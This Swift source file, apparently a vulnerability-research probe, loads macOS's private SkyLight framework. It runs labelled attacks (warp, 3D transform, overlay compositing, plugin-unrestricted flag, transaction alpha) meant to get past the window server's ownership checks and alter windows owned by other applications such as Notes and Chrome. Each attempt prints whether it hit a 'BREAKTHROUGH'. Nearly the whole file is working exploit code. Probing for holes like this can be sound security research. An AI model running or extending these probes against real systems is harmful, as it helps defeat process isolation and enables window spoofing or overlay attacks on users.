/// Probe08 — Transaction warp, 3D transform, overlay compositing group, plugin-unrestricted
///
/// New vectors discovered from full symbol enumeration and disassembly:
///
/// A) SLSTransactionSetWindowWarp (opcode 0x11) cross-process
///    - Mesh deformation transform, completely different code path from affine transform (0x0f)
///    - NO CGSWindowGetMappedImpl in encoder — server-side ownership check UNKNOWN
///    - A scale-equivalent mesh at 0.5x could bypass if server treats warp differently
///
/// B) SLSTransactionSetWindowTransform3D (opcode 0x10) cross-process
///    - 3D (CATransform3D) variant of transform — different opcode from 2D (0x0f)
///    - Signature: (txn, wid, CATransform3D_ptr) — SIMPLER than 2D variant
///    - Server might handle 3D transform path separately from 2D ownership check
///
/// C) SLSTransactionSetWindowCreatesOverlayCompositingGroup (opcode 0x6e) + overlay context
///    - "Creates overlay compositing group" for a window
///    - Combined with SLSTransactionSetWindowOverlayContext, could allow our context to overlay
///
/// D) SLSTransactionSetPluginRenderingIsUnrestrictedForWindow (opcode 0x7b) then transform
///    - Sets "plugin rendering unrestricted" flag on a window
///    - If this flag disables ownership check for subsequent transform, we can proceed
///
/// E) SLSTransactionSetWindowSystemAlpha (opcode 0x0e) cross-process
///    - Transaction variant vs direct SLSSetWindowAlpha (both blocked per Probe05)
///    - Verify transaction path has same ownership model as direct path

import AppKit
import SkyLightBridge

let lib = dlopen("/System/Library/PrivateFrameworks/SkyLight.framework/SkyLight", RTLD_LAZY)!
func sym<T>(_ name: String) -> T { unsafeBitCast(dlsym(lib, name)!, to: T.self) }

// Transaction create/commit
typealias TxCreateFn = @convention(c) (Int32) -> UnsafeMutableRawPointer?
typealias TxCommitFn = @convention(c) (UnsafeMutableRawPointer, Int32, Int32) -> Int32
let txCreate: TxCreateFn = sym("SLSTransactionCreate")
let txCommit: TxCommitFn = sym("SLSTransactionCommit")

// SLSTransactionSetWindowWarp(txn, wid, rows, cols, float_array)
// Opcode 0x11 — mesh deformation, rows*cols floats in array
typealias WarpFn = @convention(c) (UnsafeMutableRawPointer, CGWindowID, Int32, Int32, UnsafePointer<Float>) -> Void
let setWarp: WarpFn = sym("SLSTransactionSetWindowWarp")

// SLSTransactionSetWindowTransform3D(txn, wid, CATransform3D_ptr)
// Opcode 0x10 — CATransform3D is 16 doubles (4x4 matrix)
typealias Tx3DFn = @convention(c) (UnsafeMutableRawPointer, CGWindowID, UnsafeRawPointer) -> Void
let setTx3D: Tx3DFn = sym("SLSTransactionSetWindowTransform3D")

// SLSTransactionSetWindowCreatesOverlayCompositingGroup(txn, wid, creates_group)
// Opcode 0x6e
typealias TxOverlayGroupFn = @convention(c) (UnsafeMutableRawPointer, CGWindowID, Bool) -> Void
let setOverlayGroup: TxOverlayGroupFn = sym("SLSTransactionSetWindowCreatesOverlayCompositingGroup")

// SLSTransactionSetWindowOverlayContext(txn, wid, context_id)
// Opcode 0x6b
typealias TxOverlayCtxFn = @convention(c) (UnsafeMutableRawPointer, CGWindowID, Int32) -> Void
let setOverlayCtx: TxOverlayCtxFn = sym("SLSTransactionSetWindowOverlayContext")

// SLSCreateLayerContext(cid, &out1, &out2) -> Int32
// Disassembly shows x1=first output ptr, x2=second output ptr; crashes if x2 is nil
typealias CreateLayerCtxFn = @convention(c) (Int32, UnsafeMutablePointer<Int32>, UnsafeMutablePointer<Int32>) -> Int32
let createLayerCtx: CreateLayerCtxFn = sym("SLSCreateLayerContext")

// SLSTransactionSetPluginRenderingIsUnrestrictedForWindow(txn, wid, unrestricted)
// Opcode 0x7b
typealias TxPluginFn = @convention(c) (UnsafeMutableRawPointer, CGWindowID, Bool) -> Void
let setPluginUnrestricted: TxPluginFn = sym("SLSTransactionSetPluginRenderingIsUnrestrictedForWindow")

// SLSTransactionSetWindowSystemAlpha(txn, wid, alpha)
// Opcode 0x0e
typealias TxAlphaFn = @convention(c) (UnsafeMutableRawPointer, CGWindowID, Float) -> Void
let setTxAlpha: TxAlphaFn = sym("SLSTransactionSetWindowSystemAlpha")

// SLSTransactionSetWindowTransform(txn, wid, x2, x3, transform_ptr) — for comparison
typealias TxTxFn = @convention(c) (UnsafeMutableRawPointer, CGWindowID, Int32, Int32, UnsafePointer<CGAffineTransform>) -> Void
let setTxTransform: TxTxFn = sym("SLSTransactionSetWindowTransform")

let ourCID = SLSMainConnectionID()

// CATransform3D = 16 doubles (row-major 4x4 matrix)
// scale(0.5, 0.5, 1.0):
//   m11=0.5, m12=0, m13=0, m14=0
//   m21=0,   m22=0.5, m23=0, m24=0
//   m31=0,   m32=0, m33=1, m34=0
//   m41=0,   m42=0, m43=0, m44=1
var caScale3D: [Double] = [
    0.5, 0,   0, 0,
    0,   0.5, 0, 0,
    0,   0,   1, 0,
    0,   0,   0, 1
]

// Warp mesh: 2x2 grid = 4 floats
// For each grid vertex, one float value.
// Testing: scale factor 0.5 at each corner
// Hypothesis: the value is the normalized destination position (0.0 to 1.0)
var warpMesh_scale05: [Float] = [0.0, 0.5, 0.0, 0.5]  // scale x to 0.5
// Alternative: maybe the float is the absolute displacement?
var warpMesh_simple: [Float] = [0.5, 0.5, 0.5, 0.5]

class AppDelegate: NSObject, NSApplicationDelegate {
    var ourWindow: NSWindow!

    func applicationDidFinishLaunching(_ notification: Notification) {
        ourWindow = NSWindow(
            contentRect: NSRect(x: 50, y: 200, width: 600, height: 400),
            styleMask: [.titled, .closable, .resizable],
            backing: .buffered,
            defer: false)
        ourWindow.title = "Probe08"
        ourWindow.backgroundColor = NSColor(red: 0.2, green: 0.6, blue: 1.0, alpha: 1.0)
        ourWindow.makeKeyAndOrderFront(nil)

        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
            self.runTests()
        }
    }

    func foreignWID() -> CGWindowID? {
        // Prefer Notes, fall back to any normal window
        let candidates = ["com.apple.Notes", "com.apple.TextEdit",
                         "com.google.Chrome", "com.apple.mail"]
        for bid in candidates {
            if let app = NSRunningApplication.runningApplications(withBundleIdentifier: bid).first {
                app.activate(options: [])
                Thread.sleep(forTimeInterval: 0.3)
                let wlist = CGWindowListCopyWindowInfo([.optionOnScreenOnly, .excludeDesktopElements], kCGNullWindowID)
                    as? [[CFString: Any]] ?? []
                if let info = wlist.first(where: {
                    ($0[kCGWindowOwnerPID as CFString] as? Int32) == app.processIdentifier &&
                    ($0[kCGWindowLayer as CFString] as? Int32 ?? 99) == 0
                }), let wid = info[kCGWindowNumber as CFString] as? CGWindowID {
                    print("Target: \(app.localizedName ?? bid) WID=\(wid)")
                    return wid
                }
            }
        }
        return nil
    }

    func applyAndCheck(label: String, wid: CGWindowID, apply: (UnsafeMutableRawPointer) -> Void) -> Double {
        guard let txn = txCreate(ourCID) else { print("  txCreate failed"); return -1 }
        apply(txn)
        let commitStatus = txCommit(txn, 0, 0)
        _ = commitStatus  // commit status is a transaction token, not an error
        Thread.sleep(forTimeInterval: 0.8)
        var tx = CGAffineTransform.identity
        SLSGetWindowTransform(ourCID, wid, &tx)
        let applied = abs(tx.a - 0.5) < 0.01
        print("  \(label): readback.a=\(tx.a)  [\(applied ? "APPLIED ← BREAKTHROUGH!" : "no visual change")]")
        if applied {
            // Reset
            guard let txn2 = txCreate(ourCID) else { return tx.a }
            let identity = CGAffineTransform.identity
            withUnsafePointer(to: identity) { setTxTransform(txn2, wid, 0, 0, $0) }
            _ = txCommit(txn2, 0, 0)
        }
        return tx.a
    }

    func runTests() {
        let ourWID = windowID(for: ourWindow)
        print("CID=\(ourCID)  OurWID=\(ourWID)")
        guard let teWID = foreignWID() else { print("No target app found"); exit(1) }
        print("")

        let scale2D = CGAffineTransform(scaleX: 0.5, y: 0.5)

        // ── CONTROL: own-window tests ──────────────────────────────────────────

        print("=== CONTROL A: SLSTransactionSetWindowWarp on OUR window ===")
        print("  (testing several mesh formats to find the right encoding)")
        // Test 1: rows=2 cols=2 mesh=[0.0, 0.5, 0.0, 0.5]
        if let txn = txCreate(ourCID) {
            var mesh1: [Float] = [0.0, 0.5, 0.0, 0.5]
            mesh1.withUnsafeBufferPointer { setWarp(txn, ourWID, 2, 2, $0.baseAddress!) }
            _ = txCommit(txn, 0, 0)
            Thread.sleep(forTimeInterval: 0.5)
            var tx = CGAffineTransform.identity
            SLSGetWindowTransform(ourCID, ourWID, &tx)
            print("  Mesh A [0.0,0.5,0.0,0.5]: readback.a=\(tx.a)  (watch screen for warp effect)")
        }
        Thread.sleep(forTimeInterval: 1.5)
        // Reset own window
        if let txn = txCreate(ourCID) {
            withUnsafePointer(to: CGAffineTransform.identity) { setTxTransform(txn, ourWID, 0, 0, $0) }
            _ = txCommit(txn, 0, 0)
        }
        Thread.sleep(forTimeInterval: 0.3)

        // Test 2: rows=2 cols=2 mesh=[0.5,0.5,0.5,0.5]
        if let txn = txCreate(ourCID) {
            var mesh2: [Float] = [0.5, 0.5, 0.5, 0.5]
            mesh2.withUnsafeBufferPointer { setWarp(txn, ourWID, 2, 2, $0.baseAddress!) }
            _ = txCommit(txn, 0, 0)
            Thread.sleep(forTimeInterval: 0.5)
            var tx = CGAffineTransform.identity
            SLSGetWindowTransform(ourCID, ourWID, &tx)
            print("  Mesh B [0.5,0.5,0.5,0.5]: readback.a=\(tx.a)  (watch screen for warp)")
        }
        Thread.sleep(forTimeInterval: 1.5)
        if let txn = txCreate(ourCID) {
            withUnsafePointer(to: CGAffineTransform.identity) { setTxTransform(txn, ourWID, 0, 0, $0) }
            _ = txCommit(txn, 0, 0)
        }
        Thread.sleep(forTimeInterval: 0.3)

        print("")
        print("=== CONTROL B: SLSTransactionSetWindowTransform3D on OUR window ===")
        if let txn = txCreate(ourCID) {
            caScale3D.withUnsafeBytes { setTx3D(txn, ourWID, $0.baseAddress!) }
            _ = txCommit(txn, 0, 0)
            Thread.sleep(forTimeInterval: 0.8)
            var tx = CGAffineTransform.identity
            SLSGetWindowTransform(ourCID, ourWID, &tx)
            print("  3D scale(0.5) on own window: readback.a=\(tx.a)  [\(abs(tx.a - 0.5) < 0.01 ? "APPLIED — 3D TX works on own window" : "no change")]")
        }
        Thread.sleep(forTimeInterval: 1.5)
        if let txn = txCreate(ourCID) {
            var identity3D: [Double] = [1,0,0,0, 0,1,0,0, 0,0,1,0, 0,0,0,1]
            identity3D.withUnsafeBytes { setTx3D(txn, ourWID, $0.baseAddress!) }
            _ = txCommit(txn, 0, 0)
        }
        print("")

        // ── ATTACK A: Warp cross-process ──────────────────────────────────────

        print("=== Attack A: SLSTransactionSetWindowWarp cross-process (opcode 0x11) ===")
        if let txn = txCreate(ourCID) {
            var mesh: [Float] = [0.0, 0.5, 0.0, 0.5]
            mesh.withUnsafeBufferPointer { setWarp(txn, teWID, 2, 2, $0.baseAddress!) }
            let cs = txCommit(txn, 0, 0)
            Thread.sleep(forTimeInterval: 0.8)
            var tx = CGAffineTransform.identity
            SLSGetWindowTransform(ourCID, teWID, &tx)
            print("  Warp cross-process: commitToken=\(cs)  readback.a=\(tx.a)  [\(abs(tx.a - 0.5) < 0.01 ? "APPLIED ← BREAKTHROUGH!" : "no change")]")
            print("  (watch screen for any visual warp on foreign window)")
        }
        Thread.sleep(forTimeInterval: 2.0)
        print("")

        // ── ATTACK B: 3D transform cross-process ─────────────────────────────

        print("=== Attack B: SLSTransactionSetWindowTransform3D cross-process (opcode 0x10) ===")
        if let txn = txCreate(ourCID) {
            caScale3D.withUnsafeBytes { setTx3D(txn, teWID, $0.baseAddress!) }
            _ = txCommit(txn, 0, 0)
            Thread.sleep(forTimeInterval: 0.8)
            var tx = CGAffineTransform.identity
            SLSGetWindowTransform(ourCID, teWID, &tx)
            print("  3D scale cross-process: readback.a=\(tx.a)  [\(abs(tx.a - 0.5) < 0.01 ? "APPLIED ← BREAKTHROUGH!" : "blocked")]")
        }
        Thread.sleep(forTimeInterval: 1.5)
        print("")

        // ── ATTACK C: Plugin-unrestricted → then transform ────────────────────

        print("=== Attack C: SetPluginRenderingIsUnrestricted(true) then Transform ===")
        // Step 1: set unrestricted flag
        if let txn = txCreate(ourCID) {
            setPluginUnrestricted(txn, teWID, true)
            let cs = txCommit(txn, 0, 0)
            print("  setPluginUnrestricted commit token=\(cs)")
        }
        Thread.sleep(forTimeInterval: 0.5)
        // Step 2: try transform
        if let txn = txCreate(ourCID) {
            withUnsafePointer(to: scale2D) { setTxTransform(txn, teWID, 0, 0, $0) }
            _ = txCommit(txn, 0, 0)
            Thread.sleep(forTimeInterval: 0.8)
            var tx = CGAffineTransform.identity
            SLSGetWindowTransform(ourCID, teWID, &tx)
            print("  Transform after unrestricted: readback.a=\(tx.a)  [\(abs(tx.a - 0.5) < 0.01 ? "APPLIED ← plugin flag bypasses check!" : "blocked")]")
        }
        // Reset
        if let txn = txCreate(ourCID) {
            setPluginUnrestricted(txn, teWID, false)
            _ = txCommit(txn, 0, 0)
        }
        Thread.sleep(forTimeInterval: 0.5)
        print("")

        // ── ATTACK D: Overlay compositing group + overlay context ─────────────

        print("=== Attack D: OverlayCompositingGroup + OverlayContext cross-process ===")
        // Create our own layer context
        var ourCtxID: Int32 = 0
        var ourCtxID2: Int32 = 0
        let ctxStatus = createLayerCtx(ourCID, &ourCtxID, &ourCtxID2)
        print("  SLSCreateLayerContext: status=\(ctxStatus) ctxID=\(ourCtxID) ctxID2=\(ourCtxID2)")

        if true {  // proceed even if ctxID is 0 to test group flag alone
            // Step 1: set overlay compositing group on foreign window
            if let txn = txCreate(ourCID) {
                setOverlayGroup(txn, teWID, true)
                let cs = txCommit(txn, 0, 0)
                print("  setOverlayGroup(teWID, true): commit token=\(cs)")
            }
            Thread.sleep(forTimeInterval: 0.3)

            // Step 2: set our context as overlay on foreign window
            if let txn = txCreate(ourCID) {
                setOverlayCtx(txn, teWID, ourCtxID)
                let cs = txCommit(txn, 0, 0)
                print("  setOverlayContext(teWID, ctxID=\(ourCtxID)): commit token=\(cs)")
            }
            Thread.sleep(forTimeInterval: 1.5)
            print("  (watch screen — any overlay effect on foreign window?)")

            // Step 3: now try transform via overlay context somehow...
            // Also try: transform our own window and see if the overlay window changes
            if let txn = txCreate(ourCID) {
                withUnsafePointer(to: scale2D) { setTxTransform(txn, teWID, 0, 0, $0) }
                _ = txCommit(txn, 0, 0)
                Thread.sleep(forTimeInterval: 0.5)
                var tx = CGAffineTransform.identity
                SLSGetWindowTransform(ourCID, teWID, &tx)
                print("  Transform after overlay setup: readback.a=\(tx.a)  [\(abs(tx.a - 0.5) < 0.01 ? "APPLIED!" : "blocked")]")
            }

            // Cleanup
            if let txn = txCreate(ourCID) {
                setOverlayGroup(txn, teWID, false)
                setOverlayCtx(txn, teWID, 0)
                _ = txCommit(txn, 0, 0)
            }
        }
        Thread.sleep(forTimeInterval: 0.5)
        print("")

        // ── ATTACK E: Transaction alpha cross-process ─────────────────────────

        print("=== Attack E: SLSTransactionSetWindowSystemAlpha cross-process ===")
        if let txn = txCreate(ourCID) {
            setTxAlpha(txn, teWID, 0.3)
            _ = txCommit(txn, 0, 0)
            Thread.sleep(forTimeInterval: 1.0)
            print("  SetWindowSystemAlpha(0.3): (watch screen — is foreign window transparent?)")
            print("  (SLSGetWindowAlpha to verify...)")

            typealias GetAlphaFn = @convention(c) (Int32, CGWindowID, UnsafeMutablePointer<Float>) -> Int32
            let getAlpha: GetAlphaFn = sym("SLSGetWindowAlpha")
            var alpha: Float = -1
            getAlpha(ourCID, teWID, &alpha)
            print("  readback alpha=\(alpha)  [\(abs(alpha - 0.3) < 0.05 ? "APPLIED — tx alpha works cross-process!" : "blocked or unchanged")]")
        }
        Thread.sleep(forTimeInterval: 1.0)
        if let txn = txCreate(ourCID) {
            setTxAlpha(txn, teWID, 1.0)
            _ = txCommit(txn, 0, 0)
        }
        print("")

        // ── ATTACK F: SetWindowTransform after SetPluginRenderingIsUnrestricted IN SAME TXN ──

        print("=== Attack F: SetPluginUnrestricted + Transform in SAME transaction ===")
        if let txn = txCreate(ourCID) {
            setPluginUnrestricted(txn, teWID, true)
            withUnsafePointer(to: scale2D) { setTxTransform(txn, teWID, 0, 0, $0) }
            _ = txCommit(txn, 0, 0)
            Thread.sleep(forTimeInterval: 0.8)
            var tx = CGAffineTransform.identity
            SLSGetWindowTransform(ourCID, teWID, &tx)
            print("  Same-txn unrestricted+transform: readback.a=\(tx.a)  [\(abs(tx.a - 0.5) < 0.01 ? "APPLIED ← BREAKTHROUGH!" : "blocked")]")
        }
        if let txn = txCreate(ourCID) {
            setPluginUnrestricted(txn, teWID, false)
            _ = txCommit(txn, 0, 0)
        }
        print("")

        print("=== Summary ===")
        print("All attacks complete. Check output above for any BREAKTHROUGH markers.")
        print("Most critical: Attack A (warp) and Attack B (3D tx) test new server-side code paths.")
        exit(0)
    }
}

let app = NSApplication.shared
app.setActivationPolicy(.regular)
let delegate = AppDelegate()
app.delegate = delegate
app.run()
